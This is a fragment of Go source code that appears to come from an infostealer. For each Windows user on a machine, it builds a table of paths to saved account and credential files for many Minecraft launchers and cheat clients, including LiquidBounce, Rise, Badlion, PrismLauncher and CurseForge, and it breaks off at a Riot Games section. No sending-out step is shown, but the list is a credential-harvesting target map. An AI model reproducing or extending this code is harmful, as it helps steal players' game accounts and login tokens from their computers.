	...
	for _, user := range hardware.GetUsers() {
		paths := map[string]map[string]string{
			...
			"Minecraft": {
				...
				"LiquidBounce":       filepath.Join(user, "AppData", "Roaming", ".minecraft", "LiquidBounce", "accounts.json"),
				...
				"CheatBreaker":       filepath.Join(user, "AppData", "Roaming", ".minecraft", "cheatbreaker_accounts.json"),
				"Minecraft Launcher": filepath.Join(user, "AppData", "Roaming", ".minecraft", "launcher_accounts_microsoft_store.json"),
				"Rise":               filepath.Join(user, "AppData", "Roaming", ".minecraft", "Rise", "alts.txt"),
				"Moon":               filepath.Join(user, "AppData", "Roaming", ".minecraft", "Moon 4.0", "accounts.json"),
				...
				"PrismLauncher":      filepath.Join(user, "AppData", "Roaming", "PrismLauncher", "accounts.json"),
				"MultiMC":            filepath.Join(user, "AppData", "Roaming", "MultiMC", "accounts.json"),
				"Modrinth":           filepath.Join(user, "AppData", "Roaming", "ModrinthApp", "app.db"),
				"Curseforge":         filepath.Join(user, "AppData", "Roaming", "Curseforge", "storage.json"),
				"Badlion":            filepath.Join(user, "AppData", "Roaming", "Badlion Client", "accounts.json"),
				"SKLauncher":         filepath.Join(user, "AppData", "Roaming", ".minecraft", "sklauncher", "accounts.bin"),
				"XMCL":               filepath.Join(user, ".minecraftx", "launcher_profiles.json"),
				"NationsGlory":       filepath.Join(user, "AppData", "Roaming", "NationsGlory", "Local Storage", "leveldb"),
			},
			"Riot Games": {
